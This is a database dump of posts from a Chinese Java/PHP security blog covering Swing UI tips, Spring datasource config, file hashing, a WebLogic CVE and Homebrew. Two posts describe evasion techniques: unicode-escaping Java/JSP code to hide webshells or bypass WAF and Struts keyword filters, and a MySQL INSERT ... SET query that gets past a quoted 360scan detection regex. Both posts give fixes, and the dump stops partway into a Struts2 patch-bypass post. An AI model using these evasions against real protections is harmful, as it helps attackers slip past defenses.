% 256];\n	}\n	// convert output back to a string\n	$data_str = &quot;&quot;;\n	for($i = 0; $i &lt; $len; $i ++) {\n		$data_str .= chr ( $data [$i] );\n		//echo $data_str.&quot;---&quot;.$data [$i].&quot;\\r\\n&quot;;\n	}\n	return $data_str;\n}\n?&gt;\n</pre>', null, '2014-04-15 11:10:49', '1', '886', null, '0', '2014-04-15 11:10:49'), ('1141', '1', '27', 'Java Swing JLabel、JPanel、JList、窗口放大缩小、最小化', '园长', '<strong>父Panel设置背景图：</strong>\n<pre class=\"brush: java; gutter: true\">jPanel1 = new JPanel() {\n    public void paintComponent(Graphics g) {\n        ImageIcon icon = new ImageIcon(this.getClass().getClassLoader().getResource(&quot;images/top_title_bg.png&quot;));\n        // 图片随窗体大小而变化\n        g.drawImage(icon.getImage(), 0, 0, this.getSize().width,this.getSize().height,this);\n    }\n};</pre>\n<p><strong>子Panel透明:</strong></p>\n<pre class=\"brush: actionscript3; gutter: true\">jPanel3.setBackground(null);\njPanel3.setOpaque(false);</pre>\n<p><strong>JLabel的背景颜色：</strong></p>\n<pre class=\"brush: java; gutter: true\">jLabel.setOpaque(true);\njLabel.setBackground(Color.RED);</pre>\n<p><strong>Swing JList 添加JLabel(Renderer)：</strong></p>\n<pre class=\"brush: actionscript3; gutter: true\">jList1 = new javax.swing.JList();\nDefaultListModel dlm = new DefaultListModel();\ndlm.addElement(new JLabel(&quot;yzmm&quot;, new ImageIcon(this.getClass().getClassLoader().getResource(&quot;images/menu_bar_home_icon.png&quot;)), SwingConstants.CENTER));\ndlm.addElement(new JLabel(&quot;我的所有文件&quot;, new ImageIcon(this.getClass().getClassLoader().getResource(&quot;images/menu_bar_file_icon.png&quot;)), SwingConstants.CENTER));\ndlm.addElement(new JLabel(&quot;桌面&quot;, new ImageIcon(this.getClass().getClassLoader().getResource(&quot;images/menu_bar_desktop_icon.png&quot;)), SwingConstants.CENTER));\njList1.setCellRenderer(new DefaultListCellRenderer(){\n    private static final long serialVersionUID = 1L;\n    @Override\n    public Component getListCellRendererComponent(JList list, Object value,\n            int index, boolean isSelected, boolean cellHasFocus) {\n        if (value instanceof JLabel) {\n            this.setText(((JLabel) value).getText());\n            this.setIcon(((JLabel) value).getIcon());\n        }\n        if (isSelected) {\n            setBackground(list.getSelectionBackground());\n            setForeground(list.getSelectionForeground());\n        } else {\n            setBackground(list.getBackground());\n            setForeground(list.getForeground());\n        }\n        return this;\n    }\n});\njList1.setModel(dlm);\njList1.setBorder(null);\njList1.setBackground(null);\njList1.setOpaque(false);\njScrollPane1.setViewportView(jList1);</pre>\n<p>可拖动：</p>\n<pre class=\"brush: java; gutter: true\">addMouseListener(new MouseAdapter() {\n       /**\n       * 按下（mousePressed 不是点击，而是鼠标被按下没有抬起\n       */\n       public void mousePressed(MouseEvent e) {\n            origin.x = e.getX();  //当鼠标按下的时候获得窗口当前的位置\n            origin.y = e.getY();\n       }\n});\naddMouseMotionListener(new MouseMotionAdapter() {\n       /**\n       * 拖动（mouseDragged 指的不是鼠标在窗口中移动，而是用鼠标拖动）\n       */\n       public void mouseDragged(MouseEvent e) {\n            Point p = getLocation();//当鼠标拖动时获取窗口当前位置\n            //设置窗口的位置\n            //窗口当前的位置 + 鼠标当前在窗口的位置 - 鼠标按下的时候在窗口的位置\n            setLocation(p.x + e.getX() - origin.x, p.y + e.getY() - origin.y);\n       }\n});</pre>\n<p>居中(初始化末尾处加)：</p>\n<pre class=\"brush: java; gutter: true\">int screenWidth = java.awt.Toolkit.getDefaultToolkit().getScreenSize().width;\nint screenHeight = java.awt.Toolkit.getDefaultToolkit().getScreenSize().height;\nDimension d = getPreferredSize();\nthis.setBounds(screenWidth / 2 - (d.width/2), screenHeight / 2 - (d.height/2), d.width, d.height);</pre>\n<p>窗口放大缩小：</p>\n<pre class=\"brush: java; gutter: true\">Dimension d1 = this.getContentPane().getSize();\nDimension d2 = this.getPreferredSize();\nif(!d1.equals(d2)){\n     this.setExtendedState(JFrame.NORMAL);\n}else{\n     this.setExtendedState(JFrame.MAXIMIZED_BOTH);\n}</pre>\n<p>最小化：</p>\n<pre class=\"brush: java; gutter: true\">this.setExtendedState(JFrame.ICONIFIED);</pre>\n文件选择：\n<pre class=\"brush: java; gutter: true\">    public void setSelectFile(JTextField jf) {\n        int result = 0;\n        String path = null;\n        JFileChooser fileChooser = new JFileChooser();\n        FileSystemView fsv = FileSystemView.getFileSystemView();\n        fileChooser.setCurrentDirectory(fsv.getHomeDirectory());\n        fileChooser.setDialogTitle(&quot;请选择保存路径.&quot;);\n        fileChooser.setApproveButtonText(&quot;确定&quot;);\n        fileChooser.setFileSelectionMode(JFileChooser.FILES_ONLY);\n        result = fileChooser.showOpenDialog(fileChooser);\n        if (JFileChooser.APPROVE_OPTION == result) {\n            path = fileChooser.getSelectedFile().getPath();\n        }\n        jf.setText(path);\n    }</pre>', null, '2014-04-16 01:09:41', '1', '674', null, '0', '2014-08-14 11:08:19');
INSERT INTO `sys_posts` VALUES ('1148', '1', '34', 'About', '园长', '<p>\n	这是一个曾经和WooYun的几位小伙伴儿一起建立的博客。<span>建立于2013年，</span>记录常见的PHP和Java安全开发的技术分享文章。\n</p>\n<p>\n	但是由于各种原因，曾经的小伙伴儿们都早已难聚。\n</p>\n<p>\n	如果你在阅读博客中的文章中有疑问请与我联系(黑产朋友请绕道~)。EMAIL:admin#javaweb.org。\n</p>', null, '2013-07-13 15:59:41', '1', '1579', null, '11', '2014-04-16 16:12:36'), ('1164', '1', '11', 'Spring 多数据源配置', '园长', 'DatabaseContextHolder.java\n<pre class=\"brush: java; gutter: true\">public class DatabaseContextHolder {\n	private static final ThreadLocal&lt;String&gt; contextHolder = new ThreadLocal&lt;String&gt;();\n	public static void setCustomerType(String customerType) {\n		contextHolder.set(customerType);\n	}\n	public static String getCustomerType() {\n		return contextHolder.get();\n	}\n	public static void clearCustomerType() {\n		contextHolder.remove();\n	}\n}</pre>\n<p>DataSourceInterceptor.java</p>\n<pre class=\"brush: java; gutter: true\">import org.aspectj.lang.JoinPoint;\nimport org.springframework.stereotype.Component;\n@Component\npublic class DataSourceInterceptor {\n	public void setdataSourceOne(JoinPoint jp) {\n		DatabaseContextHolder.setCustomerType(&quot;jwDataSource&quot;);\n	}\n	public void setdataSourceTwo(JoinPoint jp) {\n		DatabaseContextHolder.setCustomerType(&quot;jwDataSource2&quot;);\n	}\n}</pre>\n<p>DynamicDataSource.java</p>\n<pre class=\"brush: java; gutter: true\">import org.springframework.jdbc.datasource.lookup.AbstractRoutingDataSource;\npublic class DynamicDataSource extends AbstractRoutingDataSource {\n	@Override\n	protected Object determineCurrentLookupKey() {\n		return DatabaseContextHolder.getCustomerType();\n	}\n}</pre>\n<p>测试类：</p>\n<p>重点是切换数据源，一般很少切，切换后记得切回去。或者给对应业务配置个AOP不然会很麻烦。</p>\n<p>DatabaseContextHolder.setCustomerType(\"jwDataSource2\");</p>\n<p>DatabaseContextHolder.clearCustomerType();</p>\n<pre class=\"brush: actionscript3; gutter: true\">import java.util.List;\nimport javax.annotation.Resource;\nimport org.springframework.jdbc.core.BeanPropertyRowMapper;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.stereotype.Repository;\n@Repository\npublic class JobDAO {\n	@Resource\n	private JdbcTemplate jdbcTemplate;\n	public void test1() {\n		String a = jdbcTemplate.queryForObject(&quot;select database()&quot;,String.class);\n		System.out.println(a);\n	}\n	public synchronized void test2() {</pre>\n<pre class=\"brush: actionscript3; gutter: true\">		DatabaseContextHolder.setCustomerType(&quot;jwDataSource2&quot;);\n		String a = jdbcTemplate.queryForObject(&quot;select database()&quot;,String.class);\n		System.out.println(a);\n		DatabaseContextHolder.clearCustomerType();\n	}\n}</pre>\n<p>核心的applicationContext.xml配置：</p>\n<pre class=\"brush: xml; gutter: true\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;\n	xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:p=&quot;http://www.springframework.org/schema/p&quot;\n	xmlns:context=&quot;http://www.springframework.org/schema/context&quot;\n	xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot; xmlns:tx=&quot;http://www.springframework.org/schema/tx&quot;\n	xmlns:mvc=&quot;http://www.springframework.org/schema/mvc&quot; xmlns:task=&quot;http://www.springframework.org/schema/task&quot;\n	xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans\n      http://www.springframework.org/schema/beans/spring-beans-3.2.xsd\n      http://www.springframework.org/schema/context\n      http://www.springframework.org/schema/context/spring-context-3.2.xsd\n      http://www.springframework.org/schema/tx\n      http://www.springframework.org/schema/tx/spring-tx-3.2.xsd\n      http://www.springframework.org/schema/aop\n      http://www.springframework.org/schema/aop/spring-aop-3.2.xsd\n      http://www.springframework.org/schema/mvc\n      http://www.springframework.org/schema/mvc/spring-mvc-3.2.xsd\n      http://www.springframework.org/schema/task\n      http://www.springframework.org/schema/task/spring-task-3.2.xsd&quot;&gt;\n	&lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot; p:prefix=&quot;/templates/&quot;&gt;\n		&lt;property name=&quot;viewClass&quot; value=&quot;org.springframework.web.servlet.view.JstlView&quot; /&gt;\n	&lt;/bean&gt;\n	&lt;context:component-scan base-package=&quot;com.javaweb.test.*&quot; /&gt;\n	&lt;tx:annotation-driven /&gt;\n	&lt;bean id=&quot;jwDataSource&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot; destroy-method=&quot;close&quot;&gt;\n		&lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt;\n		&lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost/test1?autoReconnect=true&amp;amp;zeroDateTimeBehavior=round&amp;amp;useUnicode=true&amp;amp;characterEncoding=UTF-8&quot; /&gt;\n		&lt;property name=&quot;username&quot; value=&quot;root&quot; /&gt;\n		&lt;property name=&quot;password&quot; value=&quot;root&quot; /&gt;\n		&lt;!--initialSize: 初始化连接 --&gt;\n		&lt;property name=&quot;initialSize&quot; value=&quot;5&quot; /&gt;\n		&lt;!--maxIdle: 最大空闲连接 --&gt;\n		&lt;property name=&quot;maxIdle&quot; value=&quot;10&quot; /&gt;\n		&lt;!--minIdle: 最小空闲连接 --&gt;\n		&lt;property name=&quot;minIdle&quot; value=&quot;5&quot; /&gt;\n		&lt;!--maxActive: 最大连接数量 --&gt;\n		&lt;property name=&quot;maxActive&quot; value=&quot;15&quot; /&gt;\n		&lt;!--removeAbandoned: 是否自动回收超时连接 --&gt;\n		&lt;property name=&quot;removeAbandoned&quot; value=&quot;true&quot; /&gt;\n		&lt;!--removeAbandonedTimeout: 超时时间(以秒数为单位) --&gt;\n		&lt;property name=&quot;removeAbandonedTimeout&quot; value=&quot;180&quot; /&gt;\n		&lt;!--maxWait: 超时等待时间以毫秒为单位 6000毫秒/1000等于60秒 --&gt;\n		&lt;property name=&quot;maxWait&quot; value=&quot;3000&quot; /&gt;\n		&lt;property name=&quot;validationQuery&quot;&gt;\n			&lt;value&gt;SELECT 1&lt;/value&gt;\n		&lt;/property&gt;\n		&lt;property name=&quot;testOnBorrow&quot;&gt;\n			&lt;value&gt;true&lt;/value&gt;\n		&lt;/property&gt;\n	&lt;/bean&gt;\n	&lt;bean id=&quot;jwDataSource2&quot; class=&quot;org.apache.commons.dbcp.BasicDataSource&quot; destroy-method=&quot;close&quot;&gt;\n		&lt;property name=&quot;driverClassName&quot; value=&quot;com.mysql.jdbc.Driver&quot; /&gt;\n		&lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost/test2?autoReconnect=true&amp;amp;zeroDateTimeBehavior=round&amp;amp;useUnicode=true&amp;amp;characterEncoding=UTF-8&quot; /&gt;\n		&lt;property name=&quot;username&quot; value=&quot;root&quot; /&gt;\n		&lt;property name=&quot;password&quot; value=&quot;root&quot; /&gt;\n		&lt;!--initialSize: 初始化连接 --&gt;\n		&lt;property name=&quot;initialSize&quot; value=&quot;5&quot; /&gt;\n		&lt;!--maxIdle: 最大空闲连接 --&gt;\n		&lt;property name=&quot;maxIdle&quot; value=&quot;10&quot; /&gt;\n		&lt;!--minIdle: 最小空闲连接 --&gt;\n		&lt;property name=&quot;minIdle&quot; value=&quot;5&quot; /&gt;\n		&lt;!--maxActive: 最大连接数量 --&gt;\n		&lt;property name=&quot;maxActive&quot; value=&quot;15&quot; /&gt;\n		&lt;!--removeAbandoned: 是否自动回收超时连接 --&gt;\n		&lt;property name=&quot;removeAbandoned&quot; value=&quot;true&quot; /&gt;\n		&lt;!--removeAbandonedTimeout: 超时时间(以秒数为单位) --&gt;\n		&lt;property name=&quot;removeAbandonedTimeout&quot; value=&quot;180&quot; /&gt;\n		&lt;!--maxWait: 超时等待时间以毫秒为单位 6000毫秒/1000等于60秒 --&gt;\n		&lt;property name=&quot;maxWait&quot; value=&quot;3000&quot; /&gt;\n		&lt;property name=&quot;validationQuery&quot;&gt;\n			&lt;value&gt;SELECT 1&lt;/value&gt;\n		&lt;/property&gt;\n		&lt;property name=&quot;testOnBorrow&quot;&gt;\n			&lt;value&gt;true&lt;/value&gt;\n		&lt;/property&gt;\n	&lt;/bean&gt;\n	&lt;bean id=&quot;dynamicDataSource&quot; class=&quot;com.javaweb.test.common.DynamicDataSource&quot;&gt;\n		&lt;property name=&quot;targetDataSources&quot;&gt;\n			&lt;map key-type=&quot;java.lang.String&quot;&gt;\n				&lt;entry value-ref=&quot;jwDataSource&quot; key=&quot;jwDataSource&quot;&gt;&lt;/entry&gt;\n				&lt;entry value-ref=&quot;jwDataSource2&quot; key=&quot;jwDataSource2&quot;&gt;&lt;/entry&gt;\n			&lt;/map&gt;\n		&lt;/property&gt;\n		&lt;property name=&quot;defaultTargetDataSource&quot; ref=&quot;jwDataSource&quot;&gt;\n		&lt;/property&gt;\n	&lt;/bean&gt;\n	&lt;!-- jdbcTemplate Spring JDBC 模版 --&gt;\n	&lt;bean id=&quot;jdbcTemplate&quot; class=&quot;org.springframework.jdbc.core.JdbcTemplate&quot; abstract=&quot;false&quot; lazy-init=&quot;false&quot; autowire=&quot;default&quot;&gt;\n		&lt;property name=&quot;dataSource&quot; ref=&quot;dynamicDataSource&quot; /&gt;\n	&lt;/bean&gt;\n	&lt;!-- mvc注解与json连接器 --&gt;\n	&lt;bean class=&quot;org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter&quot; /&gt;\n	&lt;bean class=&quot;org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping&quot; /&gt;\n	&lt;mvc:default-servlet-handler /&gt;\n	&lt;bean class=&quot;org.springframework.web.servlet.mvc.annotation.AnnotationMethodHandlerAdapter&quot;&gt;\n		&lt;property name=&quot;messageConverters&quot;&gt;\n			&lt;list&gt;\n				&lt;bean class=&quot;org.springframework.http.converter.json.MappingJacksonHttpMessageConverter&quot;&gt;\n					&lt;property name=&quot;supportedMediaTypes&quot;&gt;\n						&lt;list&gt;\n							&lt;value&gt;application/json;charset=UTF-8&lt;/value&gt;\n						&lt;/list&gt;\n					&lt;/property&gt;\n				&lt;/bean&gt;\n			&lt;/list&gt;\n		&lt;/property&gt;\n	&lt;/bean&gt;\n	&lt;!-- 上传拦截，如最大上传值及最小上传值 --&gt;\n	&lt;bean id=&quot;multipartResolver&quot;\n		class=&quot;org.springframework.web.multipart.commons.CommonsMultipartResolver&quot;&gt;\n		&lt;property name=&quot;maxUploadSize&quot; value=&quot;100000&quot; /&gt;\n	&lt;/bean&gt;\n	&lt;bean id=&quot;transactionManager&quot; class=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;\n		&lt;property name=&quot;dataSource&quot; ref=&quot;dynamicDataSource&quot; /&gt;\n	&lt;/bean&gt;\n	&lt;aop:config&gt;\n		&lt;aop:advisor pointcut=&quot;execution(public * com.javaweb.test.*.*(..))&quot; advice-ref=&quot;txAdvice&quot; /&gt;\n	&lt;/aop:config&gt;\n	&lt;tx:advice id=&quot;txAdvice&quot; transaction-manager=&quot;transactionManager&quot;&gt;\n		&lt;tx:attributes&gt;\n			&lt;tx:method name=&quot;get*&quot; read-only=&quot;true&quot; propagation=&quot;NOT_SUPPORTED&quot; /&gt;\n			&lt;tx:method name=&quot;*&quot; /&gt;\n		&lt;/tx:attributes&gt;\n	&lt;/tx:advice&gt;\n&lt;/beans&gt;</pre>\n<p>参考：http://blog.csdn.net/wangpeng047/article/details/8866239、http://blog.csdn.net/fhd001/article/details/6788304</p>', null, '2014-04-16 16:37:49', '1', '715', null, '0', '2014-05-05 16:02:04'), ('1170', '1', '3', 'Java、PHP 文件MD5、Sha1', '园长', '加密的其实并不是一个文件而是文件的内容(FileInputStream),加密的其实是一个流(InputStream)。java.security 中的MessageDigest已经自带了一些基础的算法。PHP就更简单了，官方默认提供了md5_file和sha1_file函数。\n<p>test.php</p>\n<pre class=\"brush: php; gutter: true\">&lt;?php \n	echo md5_file(&quot;/Users/yz/bdlogo.gif&quot;).&quot;\\r\\n&quot;;\n	echo sha1_file(&quot;/Users/yz/bdlogo.gif&quot;).&quot;\\r\\n&quot;;\n?&gt;</pre>\n<p>MD5FileUtil.java</p>\n<pre class=\"brush: java; gutter: true\">import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.InputStream;\nimport java.math.BigInteger;\nimport java.security.MessageDigest;\npublic class MD5FileUtil {\n	/**\n	 * 获取文件MD5值\n	 * @param file\n	 * @return\n	 */\n	public static String getFileMD5(File file) {\n		if (!file.isFile()) {\n			return null;\n		}\n		try {\n			return getInputStreamMD5(new FileInputStream(file));\n		} catch (FileNotFoundException e) {\n		}\n		return null;\n	}\n	/**\n	 * 获取输入流的MD5值\n	 * @param is\n	 * @return\n	 */\n	public static String getInputStreamMD5(InputStream is) {\n		if (is == null) {\n			return null;\n		}\n		MessageDigest digest = null;\n		byte buffer[] = new byte[8192];\n		int len;\n		try {\n			digest = MessageDigest.getInstance(&quot;MD5&quot;);\n			while ((len = is.read(buffer)) != -1) {\n				digest.update(buffer, 0, len);\n			}\n			BigInteger bigInt = new BigInteger(1, digest.digest());\n			return bigInt.toString(16);\n		} catch (Exception e) {\n			ClientLogger.clog(e);\n			return null;\n		} finally {\n			try {\n				is.close();\n			} catch (Exception e) {\n				ClientLogger.clog(e);\n			}\n		}\n	}\n	public static String getFileSha1(File file) {\n		if (!file.isFile()) {\n			return null;\n		}\n		try {\n			return getInputStreamSha1(new FileInputStream(file));\n		} catch (FileNotFoundException e) {\n		}\n		return null;\n	}\n	public static String getInputStreamSha1(InputStream is) {\n		MessageDigest digest = null;\n		byte buffer[] = new byte[8192];\n		int len;\n		try {\n			digest = MessageDigest.getInstance(&quot;SHA-1&quot;);\n			while ((len = is.read(buffer)) != -1) {\n				digest.update(buffer, 0, len);\n			}\n			BigInteger bigInt = new BigInteger(1, digest.digest());\n			return bigInt.toString(16);\n		} catch (Exception e) {\n			ClientLogger.clog(e);\n			return null;\n		} finally {\n			try {\n				is.close();\n			} catch (Exception e) {\n				ClientLogger.clog(e);\n			}\n		}\n	}\n}</pre>', null, '2014-04-16 18:25:57', '1', '619', null, '0', '2014-04-16 18:25:57'), ('1187', '1', '14', 'WebLogic CVE-2014-2470', '园长', 'Oracle WebLogic很容易出现一个远程安全漏洞。攻击者无需身份验证即可控制WebLogic服务器。漏洞利用T3协议使WLS Security子组建受影响。\n<p>版本：10.0.2.0, 10.3.6.0, 12.1.1.0, 12.1.2.0</p>\n<p><h5><strong>WebLogic Server 中的 RMI 通信</strong></h5></p>\n<p><del><a name=\"wp1000015924\"></a></del>WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。服务器实例将跟踪所连接的每个 Java 虚拟机（Java Virtual Machine，简称 JVM），并创建单个 T3 连接以承担 JVM 的所有流量。请参阅<em></em>“管理控制台联机帮助”中的<a href=\"http://edocs.weblogicfans.net/wls/docs92/ConsoleHelp/taskhelp/channels/ConfigureT3Protocol.html\">配置 T3 协议</a>。</p>\n<p><del><a name=\"wp1000015926\"></a></del>例如，如果 Java 客户端访问 WebLogic Server 上的企业 Bean 和 JDBC 连接缓冲池，那么 WebLogic Server JVM 和客户端 JVM 之间就会建立起单个网络连接。因为 T3 协议能在单个连接上隐性地多路复用数据包，所以可以编写 EJB 和 JDBC 服务，就好像这些服务单独使用了专用网络连接。</p>', null, '2014-04-18 10:43:37', '1', '697', null, '0', '2014-04-18 10:48:01'), ('1191', '1', '10', 'Homebrew OS X 或缺的软件包管理器', '园长', '<a href=\"http://brew.sh/index_zh-cn.html\">http://brew.sh/</a>\n<p>在 OS X 中找不到您想要的软件？Homebrew <a title=\"Homebrew 软件包列表\" href=\"https://github.com/Homebrew/homebrew/tree/master/Library/Formula\">给你所需</a>。</p>\n<pre class=\"brush: shell; gutter: true\">$ brew install wget</pre>\nHomebrew 将软件包分装到单独的目录，然后 symlink 到<code>/usr/local</code> 中。\n<pre class=\"brush: shell; gutter: true\">$ cd /usr/local\n$ find Cellar\nCellar/wget/1.15\nCellar/wget/1.15/bin/wget\nCellar/wget/1.15/share/man/man1/wget.1\n$ ls -l bin\nbin/wget -&gt; ../Cellar/wget/1.15/bin/wget</pre>\n<p>Homebrew 不会把文件安装到预置目录之外，所以您可以将 Homebrew 安装到任何位置。</p>\n<p>轻松创建您自己的 Homebrew 软件包。</p>\n<pre class=\"brush: shell; gutter: true\">$ brew create http://foo.com/bar-1.0.tgz\nCreated /usr/local/Library/Formula/bar.rb</pre>\n<p>完全基于 git 和 ruby，您可以很方便地撤销、更改或合并上流的更新。</p>\n<pre class=\"brush: shell; gutter: true\">$ brew edit wget # opens in $EDITOR!</pre>\nHomebrew 的 formula 都是简单的 Ruby 脚本：\n<pre class=\"brush: shell; gutter: true\">require &quot;formula&quot;\nclass Wget &lt; Formula\n  homepage &quot;http://www.gnu.org/software/wget/&quot;\n  url &quot;http://ftp.gnu.org/gnu/wget/wget-1.15.tar.gz&quot;\n  sha1 &quot;f3c925f19dfe5ed386daae4f339175c108c50574&quot;\n  def install\n    system &quot;./configure&quot;, &quot;--prefix=#{prefix}&quot;\n    system &quot;make&quot;, &quot;install&quot;\n  end\nend</pre>\n<p>Homebrew 使 OS X 更完整。用 gem 来安装您的 gems、用 brew 来搞定它们的依赖包。</p>\n<pre class=\"brush: shell; gutter: true\">ruby -e &quot;$(curl -fsSL https://raw.github.com/Homebrew/homebrew/go/install)&quot;</pre>\n打开 Terminal, 复制并粘贴以上指令。\n<div>\n该脚本首先会解释它要做什么并暂停操作，在指令确认之后才会开始安装。更多的安装选项请查看 <a href=\"https://github.com/Homebrew/homebrew/wiki/Installation\">这里</a>（需要10.5）。\n</div>', null, '2014-04-18 23:12:00', '1', '612', null, '0', '2014-04-19 18:38:30'), ('1196', '1', '14', 'Java 后门-unicode编码', '园长', 'Java代码默认可以直接全是unicode编码： 假设有如下未编码Java代码：\n<pre class=\"brush: java; gutter: true\">public class Test {\n	public static void main(String[] args) {\n		System.out.println(1);\n	}\n}</pre>\n<p>编码后的Java代码：</p>\n<pre class=\"brush: java; gutter: true\">\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063 \\u0063\\u006c\\u0061\\u0073\\u0073 \\u0054\\u0065\\u0073\\u0074 \\u007b\n	\\u0070\\u0075\\u0062\\u006c\\u0069\\u0063 \\u0073\\u0074\\u0061\\u0074\\u0069\\u0063 \\u0076\\u006f\\u0069\\u0064 \\u006d\\u0061\\u0069\\u006e\\u0028\n			\\u0053\\u0074\\u0072\\u0069\\u006e\\u0067\\u005b\\u005d \\u0061\\u0072\\u0067\\u0073\\u0029 \\u007b\n		\\u0053\\u0079\\u0073\\u0074\\u0065\\u006d.out.println\\u0028\\u0031\\u0029\\u003b\n	\\u007d\n\\u007d</pre>\n<p>这段代码输出的结果是1，为了以示区别代码中间故意写了十进制的.out.println。 <a href=\"http://javaweb.org/wp-content/uploads/2014/04/14.jpg\"><img class=\"alignnone size-full wp-image-1197\" src=\"http://javaweb.org/wp-content/uploads/2014/04/14.jpg\" alt=\"1\" width=\"1018\" height=\"242\" /></a> 既然知道即便是使用unicode编码等效于普通的十进制代码，那么首先想到的肯定是可以用来隐藏webshell或者绕过WAF或补丁继续攻击Struts。 某些Struts2关键字绕过： <a href=\"http://javaweb.org/wp-content/uploads/2014/04/2.jpg\"><img class=\"alignnone size-full wp-image-1198\" src=\"http://javaweb.org/wp-content/uploads/2014/04/2.jpg\" alt=\"2\" width=\"1321\" height=\"259\" /></a> Jsp里面一样可以使用unicode编码去替代关键字： <a href=\"http://javaweb.org/wp-content/uploads/2014/04/3.jpg\"><img class=\"alignnone size-full wp-image-1199\" src=\"http://javaweb.org/wp-content/uploads/2014/04/3.jpg\" alt=\"3\" width=\"872\" height=\"258\" /></a> 既然知道有这样的恶意攻击的可能性，那么应该怎样去修复此类问题呢？当然是先把unicode转码了。</p>\n<pre class=\"brush: java; gutter: true\">        /**\n	 * unicode 转换成 utf-8\n	 * \n	 * @param str\n	 * @return\n	 */\n	public static String unicodeToUtf8(String str) {\n		if(str==null||str.length()&lt;1){\n			return str;\n		}\n		char aChar;\n		int len = str.length();\n		StringBuffer outBuffer = new StringBuffer(len);\n		for (int x = 0; x &lt; len;) {\n			aChar = str.charAt(x++);\n			if (aChar == &#039;\\\\&#039;) {\n				aChar = str.charAt(x++);\n				if (aChar == &#039;u&#039;) {\n					int value = 0;\n					for (int i = 0; i &lt; 4; i++) {\n						aChar = str.charAt(x++);\n						switch (aChar) {\n						case &#039;0&#039;:\n						case &#039;1&#039;:\n						case &#039;2&#039;:\n						case &#039;3&#039;:\n						case &#039;4&#039;:\n						case &#039;5&#039;:\n						case &#039;6&#039;:\n						case &#039;7&#039;:\n						case &#039;8&#039;:\n						case &#039;9&#039;:\n							value = (value &lt;&lt; 4) + aChar - &#039;0&#039;;\n							break;\n						case &#039;a&#039;:\n						case &#039;b&#039;:\n						case &#039;c&#039;:\n						case &#039;d&#039;:\n						case &#039;e&#039;:\n						case &#039;f&#039;:\n							value = (value &lt;&lt; 4) + 10 + aChar - &#039;a&#039;;\n							break;\n						case &#039;A&#039;:\n						case &#039;B&#039;:\n						case &#039;C&#039;:\n						case &#039;D&#039;:\n						case &#039;E&#039;:\n						case &#039;F&#039;:\n							value = (value &lt;&lt; 4) + 10 + aChar - &#039;A&#039;;\n							break;\n						default:\n							throw new IllegalArgumentException(\n									&quot;Malformed   \\\\uxxxx   encoding.&quot;);\n						}\n					}\n					outBuffer.append((char) value);\n				} else {\n					if (aChar == &#039;t&#039;)\n						aChar = &#039;\\t&#039;;\n					else if (aChar == &#039;r&#039;)\n						aChar = &#039;\\r&#039;;\n					else if (aChar == &#039;n&#039;)\n						aChar = &#039;\\n&#039;;\n					else if (aChar == &#039;f&#039;)\n						aChar = &#039;\\f&#039;;\n					outBuffer.append(aChar);\n				}\n			} else\n				outBuffer.append(aChar);\n		}\n		return outBuffer.toString();\n	}</pre>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/04/4.jpg\"><img class=\"alignnone size-full wp-image-1203\" src=\"http://javaweb.org/wp-content/uploads/2014/04/4.jpg\" alt=\"4\" width=\"1027\" height=\"268\" /></a></p>\n<p>Apache-commons-lang同样也提供了对应的转换:</p>\n<pre class=\"brush: java; gutter: true\">import org.apache.commons.lang.StringEscapeUtils;\npublic class Test {\n	public static void main(String[] args) {\n		String a=&quot;\\\\u0048\\\\u0065\\\\u006C\\\\u006C\\\\u006F&quot;;\n		String b = StringEscapeUtils.unescapeJava(a);\n		System.out.println(b);\n	}\n}</pre>', null, '2014-04-21 13:02:48', '1', '574', null, '2', '2014-04-22 00:15:20'), ('1210', '1', '14', 'Mysql Insert into set语法绕过360scan insert防注入', '园长', '360scan正则：INSERT\\\\s+INTO.+?VALUES\n<p>其实Mysql不只可以用insert into xxx values 插入数据，还可以:insert into xxx set xx =</p>\n<p>提交：</p>\n<pre class=\"brush: sql; gutter: true\">http://localhost/360.php?sql=insert into user (user,pass) values (&#039;admin&#039;,&#039;123456&#039;)</pre>\n<a href=\"http://javaweb.org/wp-content/uploads/2014/04/21.jpg\"><img class=\"alignnone size-full wp-image-1211\" src=\"http://javaweb.org/wp-content/uploads/2014/04/21.jpg\" alt=\"2\" width=\"673\" height=\"498\" /></a>\n提交set语法：\n<pre class=\"brush: sql; gutter: true\">http://localhost/360.php?sql=insert into user set user=&#039;admin&#039;,pass=&#039;123456&#039;</pre>\n<a href=\"http://javaweb.org/wp-content/uploads/2014/04/15.jpg\"><img class=\"alignnone size-full wp-image-1212\" src=\"http://javaweb.org/wp-content/uploads/2014/04/15.jpg\" alt=\"1\" width=\"1169\" height=\"507\" /></a>\n修复方法当然最好是加上set了。', null, '2014-04-23 14:12:32', '1', '583', null, '1', '2014-04-23 14:12:32'), ('1214', '1', '14', 'Struts2再曝高危漏洞(S2-020补丁绕过)', '园长', '<p style=\"color: #737373;\"><span style=\"color: #000000;\">之前S2-020漏洞利用方式见drops：</span><a style=\"color: #002e8c;\" href=\"http://drops.wooyun.org/papers/1377\" target=\"_blank\">Struts2 Tomcat class.classLoader.resources.dirContext.docBase赋值造成的DoS及远程代码执行利用!</a><span style=\"color: #000000;\"> </span></p>\n<p><p style=\"color: #737373;\"><br style=\"color: #000000;\" /><span style=\"color: #000000;\">暂时不清楚到底是谁发出来的补丁绕过。之前 @</span><a style=\"color: #002e8c;\" href=\"http://zone.wooyun.org/user/Nebula\" target=\"_blank\">Nebula</a><span style=\"color: #000000;\"> 发的Tomcat：</span></p></p>\n<pre 